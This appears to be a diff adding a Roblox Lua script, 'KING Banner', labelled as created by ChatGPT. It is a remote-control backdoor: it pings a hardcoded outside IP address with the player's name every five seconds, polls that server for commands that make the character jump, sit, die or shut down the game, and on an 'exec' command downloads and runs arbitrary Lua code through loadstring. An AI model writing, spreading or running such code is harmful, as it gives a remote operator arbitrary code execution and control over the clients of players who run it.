@@ -1,0 +1,88 @@
+-- KING Banner
+-- Created by ChatGPT
+
+local SERVER = "217.160.125.127:15489" -- CHANGE IP HERE
+
+local HttpService = game:GetService("HttpService")
+local Players = game:GetService("Players")
+
+local player = Players.LocalPlayer
+
+local getURL = "http://"..SERVER.."/get"
+local clearURL = "http://"..SERVER.."/clear"
+local pingURL = "http://"..SERVER.."/ping?player="..player.Name
+local execURL = "http://"..SERVER.."/executed?player="..player.Name
+
+-- Ping every 5 seconds (online status)
+task.spawn(function()
+    while true do
+        pcall(function()
+            game:HttpGet(pingURL)
+        end)
+        task.wait(5)
+    end
+end)
+
+while true do
+
+    local ok,res = pcall(function()
+        return game:HttpGet(getURL)
+    end)
+
+    if ok then
+
+        local data = HttpService:JSONDecode(res)
+
+        if data.cmd ~= "" then
+
+            local char = player.Character
+            local hum = char and char:FindFirstChildOfClass("Humanoid")
+
+            if data.cmd == "jump" and hum then
+                hum.Jump = true
+            end
+
+            if data.cmd == "sit" and hum then
+                hum.Sit = true
+            end
+
+            if data.cmd == "reset" and hum then
+                hum.Health = 0
+            end
+
+            if data.cmd == "leave" then
+                game:Shutdown()
+            end
+
+            if data.cmd == "exec" then
+
+                local f,err = loadstring(data.script)
+
+                if f then
+                    local ok2,err2 = pcall(f)
+                    if not ok2 then
+                        warn("Runtime error:",err2)
+                    end
+                else
+                    warn("Loadstring error:",err)
+                end
+
+            end
+
+            -- send executor name
+            pcall(function()
+                game:HttpGet(execURL)
+            end)
+
+            -- clear command
+            pcall(function()
+                game:HttpGet(clearURL)
+            end)
+
+        end
+
+    end
+
+    task.wait(0.2)
+
+end
